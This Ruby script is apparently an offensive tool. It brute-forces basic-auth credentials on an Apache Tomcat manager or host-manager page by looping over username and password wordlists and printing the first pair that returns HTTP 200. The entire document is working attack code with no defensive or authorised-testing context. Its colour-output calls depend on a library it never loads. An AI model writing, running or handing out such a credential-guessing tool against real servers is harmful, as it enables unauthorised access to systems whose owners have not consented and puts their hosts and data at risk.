#!/usr/bin/env ruby

require 'net/http'
require 'uri'
require 'optparse'

options = {}

OptionParser.new do |opts|
  opts.banner = "Tomcat manager or host-manager credential bruteforcing"

  opts.on("-U URL", "--url URL", "URL to tomcat page") do |url|
    options[:url] = url
  end

  opts.on("-P PATH", "--path PATH", "manager or host-manager URI") do |path|
    options[:path] = path
  end

  opts.on("-u USERNAMES", "--usernames USERNAMES", "Users File") do |usernames|
    options[:usernames] = usernames
  end

  opts.on("-p PASSWORDS", "--passwords PASSWORDS", "Passwords Files") do |passwords|
    options[:passwords] = passwords
  end
end.parse!

url = options[:url]
uri = options[:path]
users_file = options[:usernames]
passwords_file = options[:passwords]

new_url = url + uri

users = File.readlines(users_file).map(&:chomp)
passwords = File.readlines(passwords_file).map(&:chomp)

puts "\n[+] Attacking.....".red.bold

users.each do |u|
  passwords.each do |p|
    uri = URI(new_url)
    req = Net::HTTP::Get.new(uri)
    req.basic_auth u, p
    response = Net::HTTP.start(uri.hostname, uri.port) { |http| http.request(req) }

    if response.code.to_i == 200
      puts "\n[+] Success!!".green.bold
      puts "[+] Username : #{u}\n[+] Password : #{p}".green.bold
      exit
    end
  end
end

puts "\n[+] Failed!!".red.bold
puts "[+] Could not Find the creds :( ".red.bold
